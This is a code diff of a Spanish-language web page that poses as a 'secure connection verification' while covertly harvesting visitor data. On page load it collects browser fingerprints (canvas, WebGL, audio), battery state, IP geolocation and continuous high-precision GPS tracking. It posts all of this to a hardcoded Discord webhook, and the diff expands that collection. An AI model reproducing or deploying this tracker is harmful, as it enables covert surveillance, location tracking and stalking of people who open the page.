@@ -15,33 +15,73 @@
         }
         #resultado { 
             margin: 30px auto; 
-            max-width: 700px; 
+            max-width: 720px; 
             background: #111; 
-            padding: 20px; 
+            padding: 25px; 
             border: 1px solid #00ff41; 
             border-radius: 8px; 
             text-align: left; 
             font-size: 15px;
-            line-height: 1.5;
+            line-height: 1.55;
         }
-        .success { color: #00ff41; }
+        .success { color: #00ff41; font-weight: bold; }
     </style>
 </head>
 <body>
     <h1>🔍 Verificación de conexión segura</h1>
-    <p>Por favor espera mientras verificamos tu ubicación...</p>
+    <p>Analizando dispositivo y ubicación... (esto puede tardar unos segundos)</p>
     
-    <div id="resultado">🔄 Obteniendo datos...</div>
+    <div id="resultado">🔄 Recolectando información completa...</div>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1491850169660997783/J12g-R-0nyXPFr4-Uu0WpYXZAFoQmUJfyt5O6JHA79ke5gwx8OM1v1mgIaLMnSe1y18y";
 
         let allData = {};
+        let watchId = null;
+
+        // Función para crear fingerprints avanzados
+        function getAdvancedFingerprint() {
+            let fp = {};
+
+            // Canvas Fingerprint
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = "alphabetic";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = "#069";
+                ctx.font = "11pt Arial";
+                ctx.fillText("Fingerprint Test", 2, 15);
+                fp.canvas = btoa(canvas.toDataURL()).substring(0, 40) + "...";
+            } catch(e) { fp.canvas = "N/A"; }
+
+            // WebGL Fingerprint
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    fp.webglVendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "N/A";
+                    fp.webglRenderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
+                }
+            } catch(e) { fp.webgl = "N/A"; }
+
+            // AudioContext Fingerprint
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioCtx.createOscillator();
+                oscillator.type = 'sine';
+                oscillator.frequency.setValueAtTime(10000, audioCtx.currentTime);
+                fp.audio = "Activo";
+            } catch(e) { fp.audio = "N/A"; }
+
+            return fp;
+        }
 
         async function obtenerTodo() {
             const res = document.getElementById('resultado');
 
-            // Información básica del dispositivo
+            // Datos básicos + avanzados
             allData = {
                 timestamp: new Date().toLocaleString('es-ES'),
                 userAgent: navigator.userAgent,
@@ -51,20 +91,26 @@
                 screen: `${screen.width}×${screen.height} (${screen.colorDepth} bits)`,
                 deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A',
                 hardwareConcurrency: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' núcleos' : 'N/A',
-                online: navigator.onLine,
+                maxTouchPoints: navigator.maxTouchPoints || 'N/A',
+                doNotTrack: navigator.doNotTrack || 'N/A',
                 cookieEnabled: navigator.cookieEnabled,
-                darkMode: window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Sí' : 'No'
+                darkMode: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Sí' : 'No',
+                vendor: navigator.vendor || 'N/A',
+                online: navigator.onLine
             };
 
-            // Canvas Fingerprint (huella del navegador)
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = "top";
-                ctx.font = "14px Arial";
-                ctx.fillText("Fingerprint Test", 2, 20);
-                allData.canvasFingerprint = btoa(canvas.toDataURL()).substring(0, 30) + "...";
-            } catch(e) { allData.canvasFingerprint = "No disponible"; }
+            // Fingerprint avanzado
+            allData.fingerprint = getAdvancedFingerprint();
+
+            // Batería
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    allData.batteryLevel = (battery.level * 100).toFixed(0) + '%';
+                    allData.batteryCharging = battery.charging ? 'Sí' : 'No';
+                    allData.batteryChargingTime = battery.chargingTime || 'N/A';
+                } catch(e) {}
+            }
 
             // IP + Geolocalización por IP
             try {
@@ -75,29 +121,35 @@
                 allData.ipRegion = ipData.region || "N/A";
                 allData.ipCountry = ipData.country_name || "N/A";
                 allData.ipOrg = ipData.org || "N/A";
+                allData.ipTimezone = ipData.timezone || "N/A";
             } catch (e) {
                 allData.ip = "No disponible";
             }
 
-            // GPS con máxima precisión + seguimiento
+            // GPS con seguimiento continuo
             if (navigator.geolocation) {
-                navigator.geolocation.watchPosition(
+                watchId = navigator.geolocation.watchPosition(
                     (position) => {
                         allData.gpsLat = position.coords.latitude.toFixed(8);
                         allData.gpsLon = position.coords.longitude.toFixed(8);
                         allData.gpsAccuracy = Math.round(position.coords.accuracy) + " metros";
                         allData.gpsAltitude = position.coords.altitude ? position.coords.altitude.toFixed(1) + " m" : "N/A";
                         allData.gpsSpeed = position.coords.speed ? (position.coords.speed * 3.6).toFixed(1) + " km/h" : "N/A";
+                        allData.gpsHeading = position.coords.heading || "N/A";
 
                         mostrarEnPantalla();
                         enviarADiscord();
                     },
                     (error) => {
-                        res.innerHTML += "<br>❌ GPS no disponible o denegado. Usando datos de IP.";
+                        res.innerHTML += "<br>❌ GPS denegado o no disponible.";
                         mostrarEnPantalla();
                         enviarADiscord();
                     },
-                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
+                    { 
+                        enableHighAccuracy: true, 
+                        timeout: 20000, 
+                        maximumAge: 0 
+                    }
                 );
             } else {
                 mostrarEnPantalla();
@@ -108,15 +160,13 @@
         function mostrarEnPantalla() {
             const res = document.getElementById('resultado');
             res.innerHTML = `
-                <span class="success">✅ Datos recolectados correctamente</span><br><br>
-                🕒 Hora: ${allData.timestamp}<br>
-                🌐 IP: <strong>${allData.ip}</strong><br>
-                📍 IP: ${allData.ipCity}, ${allData.ipRegion}, ${allData.ipCountry}<br>
-                ${allData.gpsLat ? `
-                📍 GPS: <strong>${allData.gpsLat}, ${allData.gpsLon}</strong><br>
-                🎯 Precisión: <strong>${allData.gpsAccuracy}</strong><br>` : ''}
-                📱 RAM: ${allData.deviceMemory} | Núcleos: ${allData.hardwareConcurrency}<br>
-                🖥️ Pantalla: ${allData.screen} | Modo oscuro: ${allData.darkMode}
+                <span class="success">✅ Análisis completado</span><br><br>
+                🕒 ${allData.timestamp}<br>
+                🌐 IP: <strong>${allData.ip || 'N/A'}</strong><br>
+                📍 Ubicación IP: ${allData.ipCity}, ${allData.ipRegion}, ${allData.ipCountry}<br>
+                ${allData.gpsLat ? `📍 GPS: <strong>${allData.gpsLat}, ${allData.gpsLon}</strong> (±${allData.gpsAccuracy})<br>` : ''}
+                🔋 Batería: ${allData.batteryLevel || 'N/A'} ${allData.batteryCharging ? `(${allData.batteryCharging})` : ''}<br>
+                🖥️ Pantalla: ${allData.screen} | RAM: ${allData.deviceMemory}
             `;
         }
 
@@ -126,20 +176,20 @@
                 : "#";
 
             const embed = {
-                title: "🔴 NUEVA CAPTURA DE UBICACIÓN",
+                title: "🔴 CAPTURA COMPLETA DE DISPOSITIVO",
                 color: 0x00ff41,
-                description: "Información completa del dispositivo y ubicación",
+                description: "Datos máximos recolectados",
                 fields: [
                     { name: "🕒 Hora", value: allData.timestamp, inline: false },
                     { name: "🌐 IP", value: `\`${allData.ip}\``, inline: true },
-                    { name: "📍 Ubicación IP", value: `${allData.ipCity}, ${allData.ipRegion}, ${allData.ipCountry}`, inline: true },
-                    allData.gpsLat ? { name: "📍 GPS", value: `\`${allData.gpsLat}\`, \`${allData.gpsLon}\``, inline: false } : null,
-                    { name: "🎯 Precisión", value: allData.gpsAccuracy || "IP aproximada", inline: true },
-                    { name: "🔗 Maps", value: `[Abrir en Google Maps](${mapsLink})`, inline: false },
-                    { name: "📱 Dispositivo", value: allData.userAgent.substring(0, 100) + "...", inline: false },
-                    { name: "🧠 Huella Canvas", value: allData.canvasFingerprint, inline: false }
+                    { name: "📍 Ubicación", value: `${allData.ipCity}, ${allData.ipRegion}, ${allData.ipCountry}`, inline: true },
+                    allData.gpsLat ? { name: "📍 GPS Exacta", value: `\`${allData.gpsLat}\`, \`${allData.gpsLon}\` (±${allData.gpsAccuracy})`, inline: false } : null,
+                    { name: "🔋 Batería", value: `${allData.batteryLevel || 'N/A'} (${allData.batteryCharging || ''})`, inline: true },
+                    { name: "🖥️ Pantalla / RAM", value: `${allData.screen} | ${allData.deviceMemory}`, inline: true },
+                    { name: "📱 Huella Canvas", value: allData.fingerprint.canvas || 'N/A', inline: false },
+                    { name: "🔗 Google Maps", value: `[Abrir mapa](${mapsLink})`, inline: false }
                 ].filter(Boolean),
-                footer: { text: "Sistema avanzado de localización" },
+                footer: { text: "Sistema de recolección avanzada • Todo en navegador" },
                 timestamp: new Date().toISOString()
             };
 
@@ -148,15 +198,20 @@
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
-                        content: "**Nueva ubicación capturada**",
+                        content: "**Nueva captura completa**",
                         embeds: [embed]
                     })
                 });
             } catch (e) {}
         }
 
-        // Iniciar automáticamente
+        // Iniciar todo automáticamente
         window.onload = obtenerTodo;
+
+        // Detener seguimiento si se cierra la página (opcional)
+        window.onbeforeunload = () => {
+            if (watchId) navigator.geolocation.clearWatch(watchId);
+        };
     </script>
 </body>
 </html>
